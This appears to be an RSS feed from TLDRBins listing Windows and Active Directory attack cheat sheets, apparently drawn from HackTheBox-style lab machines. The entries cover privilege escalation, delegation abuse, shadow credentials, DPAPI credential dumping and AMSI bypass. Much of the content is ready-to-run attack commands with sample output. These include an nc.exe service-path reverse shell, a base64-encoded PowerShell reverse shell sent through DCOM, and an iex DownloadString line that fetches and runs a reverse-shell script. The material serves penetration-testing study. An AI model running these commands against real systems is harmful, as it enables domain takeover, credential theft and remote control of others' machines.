<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Windows on TLDRBins</title>
    <link>https://tldrbins.github.io/@windows/</link>
    <description>Recent content in Windows on TLDRBins</description>
    <generator>Hugo</generator>
    <language>en-us</language>
    <atom:link href="https://tldrbins.github.io/@windows/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Abuse Parent Child Domain Trusts</title>
      <link>https://tldrbins.github.io/abuse_parent_child_domain_trusts/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/abuse_parent_child_domain_trusts/</guid>
      <description>Privesc from DA (Domain Admin) to EA (Enterprise Admin) Windows 1. Check trust relationships # Get all trusted domain objects in a forest Get-ADTrust -Filter * PS C:\Windows\system32&amp;gt; Get-ADTrust -Filter * Direction : BiDirectional DisallowTransivity : False DistinguishedName : CN=example.com,CN=System,DC=corp,DC=example,DC=com ForestTransitive : False IntraForest : True IsTreeParent : False IsTreeRoot : False Name : example.com ObjectClass : trustedDomain ObjectGUID : b0c64079-6f51-4516-9a62-90f94666bfc1 SelectiveAuthentication : False SIDFilteringForestAware : False SIDFilteringQuarantined : False Source : DC=corp,DC=example,DC=com Target : example.</description>
    </item>
    <item>
      <title>Account Operators</title>
      <link>https://tldrbins.github.io/account_operators/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/account_operators/</guid>
      <description>Privesc #1: Create a new user account and add it to LAPS (Local Administrator Password Solution) group Windows 1. Import PowerView.ps1 . .\PowerView.ps1 *Evil-WinRM* PS C:\programdata&amp;gt; . .\PowerView.ps1 2. Create a cred object (runas) [optional] $username = &amp;#39;&amp;lt;DOMAIN&amp;gt;\&amp;lt;USER&amp;gt;&amp;#39; $password = ConvertTo-SecureString &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -AsPlainText -Force $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password 3. Create a new user password object $new_user_password = ConvertTo-SecureString &amp;#39;&amp;lt;NEW_USER_PASSWORD&amp;gt;&amp;#39; -AsPlainText -Force *Evil-WinRM* PS C:\programdata&amp;gt; $new_user_password = ConvertTo-SecureString &amp;#39;Test1234&amp;#39; -AsPlainText -Force 4.</description>
    </item>
    <item>
      <title>AD Recycle Bin</title>
      <link>https://tldrbins.github.io/ad_recycle_bin/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/ad_recycle_bin/</guid>
      <description>Privesc #1: Restore deleted AD account Windows 1. Import AD module import-module activedirectory *Evil-WinRM* PS C:\Users\test.user\Documents&amp;gt; import-module activedirectory 2. Query all deleted objects within domain Get-ADObject -filter &amp;#39;isDeleted -eq $true -and name -ne &amp;#34;Deleted Objects&amp;#34;&amp;#39; -includeDeletedObjects *Evil-WinRM* PS C:\Users\test.user\Documents&amp;gt; Get-ADObject -filter &amp;#39;isDeleted -eq $true -and name -ne &amp;#34;Deleted Objects&amp;#34;&amp;#39; -includeDeletedObjects Deleted : True DistinguishedName : CN=Another User\0ADEL:ebe15df5-e265-45ec-b7fc-359877217138,CN=Deleted Objects,DC=example,DC=com Name : Another User DEL:ebe15df5-e265-45ec-b7fc-359877217138 ObjectClass : user ObjectGUID : ebe15df5-e265-45ec-b7fc-359877217138 3. Get all details for the deleted account Get-ADObject -filter { SAMAccountName -eq &amp;#39;&amp;lt;DELETED_USER&amp;gt;&amp;#39; } -includeDeletedObjects -property * *Evil-WinRM* PS C:\Users\test.</description>
    </item>
    <item>
      <title>ADCS</title>
      <link>https://tldrbins.github.io/adcs/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/adcs/</guid>
      <description>Enum (From Linux) certipy-ad nxc certipy-ad find -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -target &amp;lt;TARGET&amp;gt; -text -stdout -vulnerable nxc ldap &amp;lt;TARGET&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -M adcs Enum (From Windows) powershell certify ADCSTemplate # Check ADCS service net start | findstr /i cert # Check env certutil # List cert templates certutil -catemplates # Get info of each template .\certify.exe find # Find vuln templates .\certify.exe find /vulnerable /currentuser # Import ADCSTemplate module import-module .</description>
    </item>
    <item>
      <title>AddKeyCredentialLink</title>
      <link>https://tldrbins.github.io/addkeycredentiallink/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/addkeycredentiallink/</guid>
      <description>Privesc #1: Shadow credentials Linux Windows 0. Pre-check [optional] python3 pywhisker.py --action list -d &amp;lt;DOMAIN&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; --dc-ip &amp;lt;DC&amp;gt; -t &amp;#39;&amp;lt;TARGET_USER&amp;gt;&amp;#39; --use-ldaps $ python3 pywhisker.py --action list -d outdated.htb -u &amp;#39;btables&amp;#39; -p &amp;#39;5myBPLPDKT3Bfq&amp;#39; --dc-ip 10.10.11.175 -t &amp;#39;sflowers&amp;#39; --use-ldaps [*] Searching for the target account [*] Target user found: CN=Susan Flowers,CN=Users,DC=outdated,DC=htb [*] Attribute msDS-KeyCredentialLink is either empty or user does not have read permissions on that attribute 1. Add shadow credentials python3 pywhisker.</description>
    </item>
    <item>
      <title>AddSelf</title>
      <link>https://tldrbins.github.io/addself/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/addself/</guid>
      <description>Privesc #1: Add self to group (From Linux) bloodyAD powerview.py 1. Add self to group # With password python3 bloodyAD.py -d &amp;lt;DOMAIN&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; --host &amp;lt;DC&amp;gt; add groupMember &amp;#39;&amp;lt;GROUP&amp;gt;&amp;#39; &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; $ python3 bloodyAD.py -d rebound.htb -u &amp;#39;oorend&amp;#39; -p &amp;#39;1GR8t@$$4u&amp;#39; --host 10.10.11.231 add groupMember SERVICEMGMT &amp;#39;oorend&amp;#39; [+] oorend added to SERVICEMGMT # With Kerberos python3 bloodyAD.py -d &amp;lt;DOMAIN&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -k --host &amp;lt;DC&amp;gt; add groupMember &amp;#39;&amp;lt;GROUP&amp;gt;&amp;#39; &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; $ python3 bloodyAD.</description>
    </item>
    <item>
      <title>ADFS</title>
      <link>https://tldrbins.github.io/adfs/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/adfs/</guid>
      <description>Abuse #1: Generate a SAML 2.0 token for some app Windows 1. Dump encrypted PFX and DKM key # With ADFS service account .\ADFSDump.exe *Evil-WinRM* PS C:\Users\adfs_gmsa$\Documents&amp;gt; .\ADFSDump.exe ___ ____ ___________ ____ / | / __ \/ ____/ ___// __ \__ ______ ___ ____ / /| | / / / / /_ \__ \/ / / / / / / __ `__ \/ __ \ / ___ |/ /_/ / __/ ___/ / /_/ / /_/ / / / / / / /_/ / /_/ |_/_____/_/ /____/_____/\__,_/_/ /_/ /_/ .</description>
    </item>
    <item>
      <title>AllowedToDelegate</title>
      <link>https://tldrbins.github.io/allowedtodelegate/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/allowedtodelegate/</guid>
      <description>Privesc #1: Forge a Ticket Linux Windows 1. Get a service ticket # For example, spn: www/dc.example.com (Check Bloodhound) sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-getST -dc-ip &amp;lt;DC_IP&amp;gt; -spn &amp;lt;SERVICE&amp;gt;/&amp;lt;TARGET_DOMAIN&amp;gt; -hashes :&amp;lt;HASH&amp;gt; -impersonate Administrator &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;&amp;#39; $ sudo ntpdate -s dc.intelligence.htb &amp;amp;&amp;amp; impacket-getST -dc-ip 10.10.10.248 -spn www/dc.intelligence.htb -hashes :80d4ea8c2d5ccfd1ebac5bd732ece5e4 -impersonate Administrator &amp;#39;intelligence.htb/svc_int&amp;#39; Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra [-] CCache file is not found. Skipping... [*] Getting TGT for user [*] Impersonating Administrator [*] Requesting S4U2self [*] Requesting S4U2Proxy [*] Saving ticket in Administrator@www_dc.</description>
    </item>
    <item>
      <title>Alternate Data Stream</title>
      <link>https://tldrbins.github.io/alternate_data_stream/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/alternate_data_stream/</guid>
      <description>Show ADS cmd powershell # cmd cmd /C dir /R &amp;lt;PATH&amp;gt; C:\Users\Administrator\Desktop&amp;gt; cmd /C dir /R C:\users\administrator\desktop Volume in drive C has no label. Volume Serial Number is 71A1-6FA1 Directory of C:\users\administrator\desktop 11/08/2017 10:05 AM &amp;lt;DIR&amp;gt; . 11/08/2017 10:05 AM &amp;lt;DIR&amp;gt; .. 12/24/2017 03:51 AM 36 hm.txt 34 hm.txt:root.txt:$DATA 11/08/2017 10:05 AM 797 Windows 10 Update Assistant.lnk 2 File(s) 833 bytes 2 Dir(s) 2,652,184,576 bytes free # Read more &amp;lt; &amp;lt;FILE&amp;gt;:&amp;lt;STREAM&amp;gt; C:\Users\Administrator\Desktop&amp;gt; more &amp;lt; hm.</description>
    </item>
    <item>
      <title>Bloodhound</title>
      <link>https://tldrbins.github.io/bloodhound/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/bloodhound/</guid>
      <description>Info Collection (From Linux) bloodhound-python # With password python3 bloodhound.py -d &amp;lt;DOMAIN&amp;gt; -u &amp;lt;USER&amp;gt; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -dc &amp;lt;DC&amp;gt; -ns &amp;lt;DC_IP&amp;gt; -c all --zip $ python3 bloodhound.py -d rebound.htb -u oorend -p &amp;#39;1GR8t@$$4u&amp;#39; -dc dc01.rebound.htb -ns 10.10.11.231 -c all --zip INFO: Found AD domain: rebound.htb INFO: Getting TGT for user INFO: Connecting to LDAP server: dc01.rebound.htb WARNING: LDAP Authentication is refused because LDAP signing is enabled. Trying to connect over LDAPS instead.</description>
    </item>
    <item>
      <title>Built-in Group</title>
      <link>https://tldrbins.github.io/built-in_group/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/built-in_group/</guid>
      <description>Abuse #1. Modify service path # Start a nc listener rlwrap nc -lvnp &amp;lt;LOCAL_PORT&amp;gt; $ rlwrap nc -lvnp 443 listening on [any] 443 ... Windows 1. Change service path # Assumed nc.exe is uploaded sc.exe config &amp;lt;SERVICE&amp;gt; binpath=&amp;#34;C:\ProgramData\nc.exe -e cmd &amp;lt;LOCAL_IP&amp;gt; &amp;lt;LOCAL_PORT&amp;gt;&amp;#34; *Evil-WinRM* PS C:\ProgramData&amp;gt; sc.exe config VSS binpath=&amp;#34;C:\ProgramData\nc.exe -e cmd 10.10.14.44 443&amp;#34; [SC] ChangeServiceConfig SUCCESS 2. Restart service # Stop service sc.exe stop &amp;lt;SERVICE&amp;gt; *Evil-WinRM* PS C:\windows\tasks&amp;gt; sc.exe stop VSS [SC] ControlService FAILED 1062: The service has not been started.</description>
    </item>
    <item>
      <title>Bypass ASMI</title>
      <link>https://tldrbins.github.io/bypass_asmi/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/bypass_asmi/</guid>
      <description>evil-winrm payloads menu Bypass-4MSI Note: have to run menu first&#xA;Amsi-Bypass-Payloads</description>
    </item>
    <item>
      <title>Constrained Delegation</title>
      <link>https://tldrbins.github.io/constrained_delegation/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/constrained_delegation/</guid>
      <description>Abuse #1: RBCD Attack Linux 1. Find delegation # Check delegation sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-findDelegation &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;&amp;#39; -dc-ip &amp;lt;DC&amp;gt; -hashes :&amp;lt;HASH&amp;gt; -k -no-pass $ sudo ntpdate -s dc01.rebound.htb &amp;amp;&amp;amp; impacket-findDelegation &amp;#39;rebound.htb/delegator$&amp;#39; -dc-ip dc01.rebound.htb -hashes :f7f7ea94cd22bd4129ca00bab335ceb9 -k -no-pass Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies [*] Getting machine hostname [-] CCache file is not found. Skipping... [-] CCache file is not found. Skipping... [*] Getting machine hostname AccountName AccountType DelegationType DelegationRightsTo SPN Exists ----------- ----------------------------------- -------------- --------------------- ---------- delegator$ ms-DS-Group-Managed-Service-Account Constrained http/dc01.</description>
    </item>
    <item>
      <title>Cross Session Relay</title>
      <link>https://tldrbins.github.io/cross_session_relay/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/cross_session_relay/</guid>
      <description>Display information about the session host Windows qwinsta * # Or runas .\RunasCs.exe x x qwinsta -l 9 *Evil-WinRM* PS C:\Users\winrm_svc\Documents&amp;gt; .\RunasCs.exe x x qwinsta -l 9 SESSIONNAME USERNAME ID STATE TYPE DEVICE &amp;gt;services 0 Disc console tbrady 1 Active Abuse #1: Steal NTLM hash RemotePotato0 KrbRelay 1. Redirect auth request back to target # In local Linux sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:&amp;lt;TARGET&amp;gt;:&amp;lt;RELAY_PORT&amp;gt; $ sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:10.10.11.231:9999 2. Trigger auth request .</description>
    </item>
    <item>
      <title>dotnet</title>
      <link>https://tldrbins.github.io/dotnet/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/dotnet/</guid>
      <description>Compile C# project Linux # Check dotnet --info # Prepare mkdir &amp;lt;PROJECT_NAME&amp;gt; cd &amp;lt;PROJECT_NAME&amp;gt; # Init dotnet new console # Create .sln file dotnet new sln # Link .sln to .csproj dotnet sln &amp;lt;PROJECT_NAME&amp;gt;.sln add &amp;lt;PROJECT_NAME&amp;gt;.csproj # Add dependencies (optional) dotnet add package System.XXXX.XXXX.XXXX --version 1.0.0 +----------------------+ |Add Code to Program.cs| +----------------------+ # Build solution dotnet build -c Release # Run dotnet run Ref: dotnet</description>
    </item>
    <item>
      <title>DPAPI</title>
      <link>https://tldrbins.github.io/dpapi/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/dpapi/</guid>
      <description>Abuse #1: Auto dump (From Linux) Linux DonPAPI collect -d &amp;lt;DOMAIN&amp;gt; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -t &amp;lt;TARGET&amp;gt; Ref: DonPAPI&#xA;Abuse #1: Auto dump (From Windows) mimikatz SharpDPAPI 1. Info Gathering cmd /c &amp;#34;dir /S /AS C:\Users\&amp;lt;USER&amp;gt;\AppData\Local\Microsoft\Vault &amp;amp; dir /S /AS C:\Users\&amp;lt;USER&amp;gt;\AppData\Local\Microsoft\Credentials &amp;amp; dir /S /AS C:\Users\&amp;lt;USER&amp;gt;\AppData\Local\Microsoft\Protect &amp;amp; dir /S /AS C:\Users\&amp;lt;USER&amp;gt;\AppData\Roaming\Microsoft\Vault &amp;amp; dir /S /AS C:\Users\&amp;lt;USER&amp;gt;\AppData\Roaming\Microsoft\Credentials &amp;amp; dir /S /AS C:\Users\&amp;lt;USER&amp;gt;\AppData\Roaming\Microsoft\Protect&amp;#34; PS C:\users\PPotts&amp;gt; cmd /c &amp;#34;dir /S /AS C:\Users\PPotts\AppData\Local\Microsoft\Vault &amp;amp; dir /S /AS C:\Users\PPotts\AppData\Local\Microsoft\Credentials &amp;amp; dir /S /AS C:\Users\PPotts\AppData\Local\Microsoft\Protect &amp;amp; dir /S /AS C:\Users\PPotts\AppData\Roaming\Microsoft\Vault &amp;amp; dir /S /AS C:\Users\PPotts\AppData\Roaming\Microsoft\Credentials &amp;amp; dir /S /AS C:\Users\PPotts\AppData\Roaming\Microsoft\Protect&amp;#34; Volume in drive C has no label.</description>
    </item>
    <item>
      <title>evil-winrm</title>
      <link>https://tldrbins.github.io/evil-winrm/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/evil-winrm/</guid>
      <description>Connection Methods Password Hash Kerberos crt &amp; key evil-winrm -i &amp;lt;TARGET&amp;gt; -u &amp;lt;USER&amp;gt; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; $ evil-winrm -i 127.0.0.1 -u dr.zaiuss -p &amp;#39;qwe123QWE!@#&amp;#39; Evil-WinRM shell v3.5 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\Users\Dr.Zaiuss\Documents&amp;gt; evil-winrm -i &amp;lt;TARGET&amp;gt; -u &amp;lt;USER&amp;gt; -H &amp;lt;HASH&amp;gt; # Step 1: Edit &amp;#39;/etc/krb5.</description>
    </item>
    <item>
      <title>ExecuteDCOM</title>
      <link>https://tldrbins.github.io/executedcom/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/executedcom/</guid>
      <description>Abuse #1: ExecuteDCOM Linux # Revshell impacket-dcomexec &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;@&amp;lt;TARGET&amp;gt;&amp;#39; &amp;#39;&amp;lt;POWERSHELL_3_BASE64&amp;gt;&amp;#39; -silentcommand -object MMC20 $ impacket-dcomexec jab.htb/svc_openfire:&amp;#39;!@#$%^&amp;amp;*(1qazxsw&amp;#39;@10.10.11.4 &amp;#39;powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMwAxACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=&amp;#39; -silentcommand -object MMC20 Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra </description>
    </item>
    <item>
      <title>File Transfer (Linux to Windows)</title>
      <link>https://tldrbins.github.io/file_transfer_linux_to_windows/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/file_transfer_linux_to_windows/</guid>
      <description>Powershell cmd evil-winrm Start a Local HTTP Server python3 -m http.server &amp;lt;LOCAL_PORT&amp;gt; $ python3 -m http.server 8443 Serving HTTP on 0.0.0.0 port 8443 (http://0.0.0.0:8443/) ... # Invoke-WebRequest iwr http://&amp;lt;LOCAL_IP&amp;gt;:&amp;lt;LOCAL_PORT&amp;gt;/&amp;lt;FILE&amp;gt; -o C:\ProgramData\&amp;lt;FILE&amp;gt; Note: PowerShell 3.0+&#xA;# Curl powershell -ep bypass curl &amp;lt;LOCAL_IP&amp;gt;:&amp;lt;LOCAL_PORT&amp;gt;/&amp;lt;FILE&amp;gt; -o C:\ProgramData\&amp;lt;FILE&amp;gt; Note: curl is not always available&#xA;# Load into memory and Run # Invoke-Expression iex (New-Object Net.WebClient).DownloadString(&amp;#39;http://&amp;lt;LOCAL_IP&amp;gt;:&amp;lt;LOCAL_PORT&amp;gt;/rev.ps1&amp;#39;);Invoke-PowerShellTcp -Reverse -IPAddress &amp;lt;LOCAL_IP&amp;gt; -Port &amp;lt;LOCAL_PORT&amp;gt; # Short version iex (iwr http://&amp;lt;LOCAL_IP&amp;gt;:&amp;lt;LOCAL_PORT&amp;gt;/rev.</description>
    </item>
    <item>
      <title>File Transfer (Windows To Linux)</title>
      <link>https://tldrbins.github.io/file_transfer_windows_to_linux/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/file_transfer_windows_to_linux/</guid>
      <description>SMB Base64 evil-winrm Start a Local SMB Server impacket-smbserver share . -smb2support cmd # Connect to SMB server without creds net use \\&amp;lt;LOCAL_IP&amp;gt;\share # Connect to SMB server with creds net use \\&amp;lt;LOCAL_IP&amp;gt;\share /u:&amp;lt;USER&amp;gt; &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; # From target Windows to local Linux copy &amp;lt;FILE&amp;gt; \\&amp;lt;LOCAL_IP&amp;gt;\share # From local Linux to target Windows copy \\&amp;lt;LOCAL_IP&amp;gt;\share\&amp;lt;FILE&amp;gt; &amp;lt;FILE&amp;gt; # Delete file del &amp;lt;FILE&amp;gt; # Remove SMB share net use /d \\&amp;lt;LOCAL_IP&amp;gt;\share # Older Windows (e.</description>
    </item>
    <item>
      <title>Find (Windows)</title>
      <link>https://tldrbins.github.io/find_windows/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/find_windows/</guid>
      <description> Windows Show hidden files Get-ChildItem -force Find a file ls -path &amp;lt;PATH&amp;gt; -Filter &amp;lt;FILE&amp;gt; -recurse -erroraction silent where /R &amp;lt;PATH&amp;gt; &amp;lt;FILE&amp;gt; Find a file, with rules dir /s /b /a:-d-h &amp;lt;PATH&amp;gt; | findstr /i /v &amp;#39;&amp;lt;STRING&amp;gt;&amp;#39; +---------------------------------------+ |dir: | |/s : include subfolders | |/b : bare format | |/a:-d-h : exclude directories or hidden| | | |findstr: | |/i : case insensitive | |/v STRING : exclude STRING | +---------------------------------------+ </description>
    </item>
    <item>
      <title>Firewall (Windows)</title>
      <link>https://tldrbins.github.io/firewall_windows/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/firewall_windows/</guid>
      <description>Windows Check Firewall Rules # cmd cmd /c &amp;#34;netsh advfirewall firewall show rule name=all|findstr Name:&amp;#34; *Evil-WinRM* PS C:\Users\maria&amp;gt; cmd /c &amp;#34;netsh advfirewall firewall show rule name=all|findstr Name:&amp;#34; Rule Name: World Wide Web Services (HTTPS Traffic-In) Rule Name: World Wide Web Services (HTTP Traffic-In) Rule Name: Shell Input Application ...[SNIP]... Rule Name: Virtual Machine Monitoring (Echo Request - ICMPv6-In) Rule Name: Virtual Machine Monitoring (Echo Request - ICMPv4-In) Rule Name: Virtual Machine Monitoring (DCOM-In) # powershell Get-NetFirewallProfile *Evil-WinRM* PS C:\Users\maria&amp;gt; Get-NetFirewallProfile Name : Domain Enabled : False DefaultInboundAction : NotConfigured DefaultOutboundAction : NotConfigured AllowInboundRules : NotConfigured AllowLocalFirewallRules : NotConfigured AllowLocalIPsecRules : NotConfigured AllowUserApps : NotConfigured AllowUserPorts : NotConfigured AllowUnicastResponseToMulticast : NotConfigured NotifyOnListen : False EnableStealthModeForIPsec : NotConfigured LogFileName : %systemroot%\system32\LogFiles\Firewall\pfirewall.</description>
    </item>
    <item>
      <title>ForceChangePassword</title>
      <link>https://tldrbins.github.io/forcechangepassword/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/forcechangepassword/</guid>
      <description>Change target user password (From Linux) BloodyAD rpcclient python3 bloodyAD.py -d &amp;lt;DOMAIN&amp;gt; -u &amp;lt;USER&amp;gt; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; --host &amp;lt;DC&amp;gt; set password &amp;#39;&amp;lt;TARGET_USER&amp;gt;&amp;#39; &amp;#39;&amp;lt;NEW_PASSWORD&amp;gt;&amp;#39; $ python3 bloodyAD.py -d object.local -u oliver -p &amp;#39;c1cdfun_d2434&amp;#39; --host jenkins.object.local set password smith &amp;#39;Test1234&amp;#39; [+] Password changed successfully! Ref: bloodyAD&#xA;rpcclient -U &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;%&amp;lt;PASSWORD&amp;gt;&amp;#39; &amp;lt;TARGET&amp;gt; -c &amp;#39;setuserinfo2 &amp;lt;TARGET_USER&amp;gt; 23 &amp;lt;NEW_PASSWORD&amp;gt;&amp;#39; $ rpcclient -U &amp;#39;object.local/oliver%c1cdfun_d2434&amp;#39; 10.10.11.132 -c &amp;#39;setuserinfo2 smith 23 Test1234&amp;#39; Change target user password (From Windows) Windows 1. Import PowerView .</description>
    </item>
    <item>
      <title>GenericAll</title>
      <link>https://tldrbins.github.io/genericall/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/genericall/</guid>
      <description>Abuse #1: Change target user password Linux Windows 1. Add Full Control to current user impacket bloodyAD&#xA;Install latest impacket (included dacledit.py) git clone https://github.com/fortra/impacket.git cd impacket pip3 install . Add Full Control to current user sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; dacledit.py -k &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#39; -dc-ip &amp;lt;DC&amp;gt; -principal &amp;lt;USER&amp;gt; -target-dn &amp;#39;OU=&amp;lt;TARGET_GROUP&amp;gt;,DC=&amp;lt;EXAMPLE&amp;gt;,DC=&amp;lt;COM&amp;gt;&amp;#39; -inheritance -action write -rights FullControl -use-ldaps $ dacledit.py -k &amp;#39;rebound.htb/oorend:1GR8t@$$4u&amp;#39; -dc-ip 10.10.11.231 -principal oorend -target-dn &amp;#39;OU=SERVICE USERS,DC=REBOUND,DC=HTB&amp;#39; -inheritance -action write -rights FullControl -use-ldaps Impacket v0.</description>
    </item>
    <item>
      <title>GenericWrite</title>
      <link>https://tldrbins.github.io/genericwrite/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/genericwrite/</guid>
